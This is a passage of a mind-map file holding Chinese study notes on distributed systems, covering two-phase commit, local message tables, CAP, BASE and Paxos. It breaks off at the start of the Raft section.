<node FOLDED="true" ID="ID_1469187603" CREATED="1754750650923" MODIFIED="1754750650925"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2PC
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2PC" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#2pc">
</a>
    <p dir="auto">
      两阶段提交（Two-phase Commit，2PC），通过引入协调者（Coordinator）来协调参与者的行为，并最终决定这些参与者是否要真正执行事务。
    </p>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_390463625" CREATED="1754750650925" MODIFIED="1754750650925"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 运行过程
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1705520355" CREATED="1754750650927" MODIFIED="1754750650928"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1.1 准备阶段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1.1 准备阶段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#11-准备阶段">
</a>
    <p dir="auto">
      协调者询问参与者事务是否执行成功，参与者发回事务执行结果。询问可以看成一种投票，需要参与者都同意才能执行。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5f5243055b8c736b72e118e515fbfbc708528d52061a6d79179ac01e21424cf8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34346433333634332d313030342d343361332d623939612d3464363838613038643061312e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5f5243055b8c736b72e118e515fbfbc708528d52061a6d79179ac01e21424cf8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34346433333634332d313030342d343361332d623939612d3464363838613038643061312e706e67" width="550px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/44d33643-1004-43a3-b99a-4d688a08d0a1.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_58495222" CREATED="1754750650929" MODIFIED="1754750650930"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1.2 提交阶段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1.2 提交阶段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#12-提交阶段">
</a>
    <p dir="auto">
      如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。
    </p>
    <p dir="auto">
      需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d00f5b2b79e3e9dc24aa764113875c35ffe4d6afa632f7d6b566eb5582dff902/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64326165393933322d653262312d343139312d386565392d6535373366333664333839352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/d00f5b2b79e3e9dc24aa764113875c35ffe4d6afa632f7d6b566eb5582dff902/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64326165393933322d653262312d343139312d386565392d6535373366333664333839352e706e67" width="550px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d2ae9932-e2b1-4191-8ee9-e573f36d3895.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1330238337" CREATED="1754750650930" MODIFIED="1754750650930"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 存在的问题
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1310862387" CREATED="1754750650932" MODIFIED="1754750650933"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2.1 同步阻塞
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2.1 同步阻塞" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#21-同步阻塞">
</a>
    <p dir="auto">
      所有事务参与者在等待其它参与者响应的时候都处于同步阻塞等待状态，无法进行其它操作。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1951388095" CREATED="1754750650934" MODIFIED="1754750650935"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2.2 单点问题
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2.2 单点问题" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#22-单点问题">
</a>
    <p dir="auto">
      协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在提交阶段发生故障，所有参与者会一直同步阻塞等待，无法完成其它操作。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_213372009" CREATED="1754750650936" MODIFIED="1754750650937"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2.3 数据不一致
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2.3 数据不一致" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#23-数据不一致">
</a>
    <p dir="auto">
      在提交阶段，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1118574652" CREATED="1754750650937" MODIFIED="1754750650939"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2.4 太过保守
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2.4 太过保守" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#24-太过保守">
</a>
    <p dir="auto">
      任意一个节点失败就会导致整个事务失败，没有完善的容错机制。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_1582914630" CREATED="1754750650939" MODIFIED="1754750650941"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      本地消息表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 本地消息表" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#本地消息表">
</a>
    <p dir="auto">
      本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性，并且使用了消息队列来保证最终一致性。
    </p>
    <ol dir="auto">
      <li>
        在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。
      </li>
      <li>
        之后将本地消息表中的消息转发到消息队列中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。
      </li>
      <li>
        在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。
      </li>
    </ol>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/beb4c419681c223f5b9180631c4f59b50ec53d73c56c787209512dce6131c410/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34373633323964342d653265662d346637622d386163392d6135326136663738343630302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/beb4c419681c223f5b9180631c4f59b50ec53d73c56c787209512dce6131c410/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34373633323964342d653265662d346637622d386163392d6135326136663738343630302e706e67" width="740px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/476329d4-e2ef-4f7b-8ac9-a52a6f784600.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1509532509" CREATED="1754750650942" MODIFIED="1754750650943"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、CAP
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、CAP" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#三cap">
</a>
    <p dir="auto">
      分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f28652fc5d9c2abbd6f54a60d6e0455d5cc9aef1445c255b5f7228fd60629bb6/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61313432363862332d623933372d346666612d613334612d3463633533303731363836622e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/f28652fc5d9c2abbd6f54a60d6e0455d5cc9aef1445c255b5f7228fd60629bb6/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61313432363862332d623933372d346666612d613334612d3463633533303731363836622e6a7067" width="450px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a14268b3-b937-4ffa-a34a-4cc53071686b.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
<node ID="ID_1624962610" CREATED="1754750650943" MODIFIED="1754750650945"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一致性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一致性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#一致性">
</a>
    <p dir="auto">
      一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。
    </p>
    <p dir="auto">
      对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1875437918" CREATED="1754750650945" MODIFIED="1754750650947"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      可用性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 可用性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#可用性">
</a>
    <p dir="auto">
      可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。
    </p>
    <p dir="auto">
      在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_106115277" CREATED="1754750650947" MODIFIED="1754750650949"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分区容忍性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分区容忍性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#分区容忍性">
</a>
    <p dir="auto">
      网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。
    </p>
    <p dir="auto">
      在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1156007280" CREATED="1754750650949" MODIFIED="1754750650951"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      权衡
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 权衡" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#权衡">
</a>
    <p dir="auto">
      在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。
    </p>
    <p dir="auto">
      可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时，
    </p>
    <ul dir="auto">
      <li>
        为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用性；
      </li>
      <li>
        为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1765006107" CREATED="1754750650951" MODIFIED="1754750650953"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、BASE
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 四、BASE" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#四base">
</a>
    <p dir="auto">
      BASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。
    </p>
    <p dir="auto">
      BASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1953858615" CREATED="1754750650953" MODIFIED="1754750650954"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      基本可用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 基本可用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#基本可用">
</a>
    <p dir="auto">
      指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。
    </p>
    <p dir="auto">
      例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1387250581" CREATED="1754750650955" MODIFIED="1754750650956"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      软状态
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 软状态" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#软状态">
</a>
    <p dir="auto">
      指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1431984663" CREATED="1754750650957" MODIFIED="1754750650958"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      最终一致性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 最终一致性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#最终一致性">
</a>
    <p dir="auto">
      最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。
    </p>
    <p dir="auto">
      ACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。
    </p>
    <p dir="auto">
      在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1934080431" CREATED="1754750650959" MODIFIED="1754750650960"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、Paxos
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 五、Paxos" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#五paxos">
</a>
    <p dir="auto">
      用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。
    </p>
    <p dir="auto">
      主要有三类节点：
    </p>
    <ul dir="auto">
      <li>
        提议者（Proposer）：提议一个值；
      </li>
      <li>
        接受者（Acceptor）：对每个提议进行投票；
      </li>
      <li>
        告知者（Learner）：被告知投票的结果，不参与投票过程。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fd3ade557b8e3e6ea20834a958936c2f978983c78385797fbbd9f4bfee03e0cd/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62393838383737632d306630612d343539332d393136642d6465323038313332303632382e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/fd3ade557b8e3e6ea20834a958936c2f978983c78385797fbbd9f4bfee03e0cd/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62393838383737632d306630612d343539332d393136642d6465323038313332303632382e6a7067" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b988877c-0f0a-4593-916d-de2081320628.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_1751768025" CREATED="1754750650961" MODIFIED="1754750650962"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      执行过程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 执行过程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#执行过程">
</a>
    <p dir="auto">
      规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1401793420" CREATED="1754750650962" MODIFIED="1754750650964"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. Prepare 阶段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. Prepare 阶段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#1-prepare-阶段">
</a>
    <p dir="auto">
      下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送 Prepare 请求。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c3f701d67b379b2acaaddf8415b0d0a4fae459a47737383271add5badea9794e/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31613939373765342d326635632d343961362d616563392d6633303237633966343661372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/c3f701d67b379b2acaaddf8415b0d0a4fae459a47737383271add5badea9794e/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31613939373765342d326635632d343961362d616563392d6633303237633966343661372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1a9977e4-2f5c-49a6-aec9-f3027c9f46a7.png"/>
    </a><br/>
    

    <p dir="auto">
      当 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n1, v1]，并且之前还未接收过 Prepare 请求，那么发送一个 Prepare 响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。
    </p>
    <p dir="auto">
      如下图，Acceptor X 在收到 [n=2, v=8] 的 Prepare 请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的 Prepare 响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d74c8b110ce5c7ff6d17d864d6971095b54437684a47cad04998d419ab7b0641/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66623434333037662d386539382d346666372d613931382d3331646163666135363462342e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/d74c8b110ce5c7ff6d17d864d6971095b54437684a47cad04998d419ab7b0641/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66623434333037662d386539382d346666372d613931382d3331646163666135363462342e6a7067" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fb44307f-8e98-4ff7-a918-31dacfa564b4.jpg"/>
    </a><br/>
    

    <p dir="auto">
      如果 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 &gt; n2，那么就丢弃该提议请求；否则，发送 Prepare 响应，该 Prepare 响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。
    </p>
    <p dir="auto">
      如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的 Prepare 请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n &gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的 Prepare 请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 &lt;= 4，因此就发送 [n=2, v=8] 的 Prepare 响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2787acc044a709a2ecedfc0c99df3eff09fbbdd01ba7a8615363a7576a71ece3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32626363353861642d626637662d343835632d383962352d6537636166633231316365322e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/2787acc044a709a2ecedfc0c99df3eff09fbbdd01ba7a8615363a7576a71ece3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32626363353861642d626637662d343835632d383962352d6537636166633231316365322e6a7067" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2bcc58ad-bf7f-485c-89b5-e7cafc211ce2.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1876042774" CREATED="1754750650965" MODIFIED="1754750650966"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. Accept 阶段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. Accept 阶段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#2-accept-阶段">
</a>
    <p dir="auto">
      当一个 Proposer 接收到超过一半 Acceptor 的 Prepare 响应时，就可以发送 Accept 请求。
    </p>
    <p dir="auto">
      Proposer A 接收到两个 Prepare 响应之后，就发送 [n=2, v=8] Accept 请求。该 Accept 请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。
    </p>
    <p dir="auto">
      Proposer B 过后也收到了两个 Prepare 响应，因此也开始发送 Accept 请求。需要注意的是，Accept 请求的 v 需要取它收到的最大提议编号对应的 v 值，也就是 8。因此它发送 [n=4, v=8] 的 Accept 请求。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8b504db8fb8493c1b3dc9e3a2e1fc8eac5fa2f82c1f4c07dab00d3c66179514f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39623833386165652d303939362d343461352d396230662d3364316533653266353130302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/8b504db8fb8493c1b3dc9e3a2e1fc8eac5fa2f82c1f4c07dab00d3c66179514f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39623833386165652d303939362d343461352d396230662d3364316533653266353130302e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9b838aee-0996-44a5-9b0f-3d1e3e2f5100.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1449300475" CREATED="1754750650967" MODIFIED="1754750650968"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. Learn 阶段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. Learn 阶段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#3-learn-阶段">
</a>
    <p dir="auto">
      Acceptor 接收到 Accept 请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送 Learn 提议给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/aca292d8d1a9168785a21c9483c3b5335d5e26a8321035b21cfd3943e5ddfe00/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62663636373539342d626234622d343633342d626639622d3035393661343534313562612e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/aca292d8d1a9168785a21c9483c3b5335d5e26a8321035b21cfd3943e5ddfe00/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62663636373539342d626234622d343633342d626639622d3035393661343534313562612e6a7067" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bf667594-bb4b-4634-bf9b-0596a45415ba.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1243069869" CREATED="1754750650969" MODIFIED="1754750650969"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      约束条件
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_548119020" CREATED="1754750650971" MODIFIED="1754750650973"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 正确性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 正确性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#1-正确性">
</a>
    <p dir="auto">
      指只有一个提议值会生效。
    </p>
    <p dir="auto">
      因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_548306503" CREATED="1754750650973" MODIFIED="1754750650974"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 可终止性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 可终止性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#2-可终止性">
</a>
    <p dir="auto">
      指最后总会有一个提议生效。
    </p>
    <p dir="auto">
      Paxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_968114403" CREATED="1754750650975" MODIFIED="1754750650977"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、Raft
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 六、Raft" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#六raft">
</a>
    <p dir="auto">
      Raft 也是分布式一致性协议，主要是用来竞选主节点。
    </p>
    <ul dir="auto">
      <li>
